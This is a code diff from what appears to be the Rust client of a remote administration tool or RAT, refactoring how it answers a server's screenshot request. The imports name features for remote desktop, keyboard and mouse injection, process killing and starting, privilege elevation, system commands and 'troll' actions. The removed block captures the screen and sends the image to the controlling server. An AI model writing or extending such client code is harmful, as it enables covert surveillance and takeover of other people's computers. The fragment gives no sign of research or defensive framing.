@@ -1,5 +1,5 @@
-use crate::features::other::{take_screenshot, client_info, visit_website, show_messagebox, elevate_client};
-use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
+use crate::features::other::{client_info, visit_website, show_messagebox, elevate_client};
+use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::system_commands::system_commands;
 use crate::features::troll::execute_troll_command;
@@ -49,48 +49,7 @@ pub async fn reading_loop(
                 }
             }
 
-            Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => {
-                match display.parse::<i32>() {
-                    Ok(display_id) => {
-                        // Take screenshot and ensure dimensions are even for YUV420
-                        let (width, height, bgra) = take_screenshot(display_id);
-                        
-                        // Ensure we got valid data
-                        if width < 2 || height < 2 || bgra.len() != width * height * 4 {
-                            println!("Invalid screenshot dimensions or data size");
-                            continue;
-                        }
-                        
-                        // Allocate YUV buffer with exact size
-                        let y_size = width * height;
-                        let uv_size = (width / 2) * (height / 2);
-                        let mut i420_buffer = Vec::with_capacity(y_size + 2 * uv_size);
-
-                        // Convert to I420
-                        common::convert::bgra_to_i420(width, height, &bgra, &mut i420_buffer);
-                        
-                        // Verify I420 buffer has expected size
-                        if i420_buffer.len() != y_size + 2 * uv_size {
-                            println!("I420 conversion failed: wrong buffer size (expected {}, got {})", 
-                                  y_size + 2 * uv_size, i420_buffer.len());
-                            continue;
-                        }
-
-                        // Create packet and send raw I420 data
-                        let screenshot_data = ScreenshotData {
-                            width: width as u32,
-                            height: height as u32,
-                            data: i420_buffer,  // Send raw I420 data
-                        };
-
-                        match send_packet(ServerboundPacket::ScreenshotResult(screenshot_data)).await {
-                            Ok(_) => println!("Sent screenshot to server"),
-                            Err(e) => println!("Error sending screenshot: {}", e),
-                        }
-                    },
-                    Err(e) => println!("Invalid display ID: {}", e),
-                }
-            }
+            Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => take_screenshot(display).await,
 
             Ok(Some(ClientboundPacket::GetProcessList)) => {
                 let process_list = process_list();
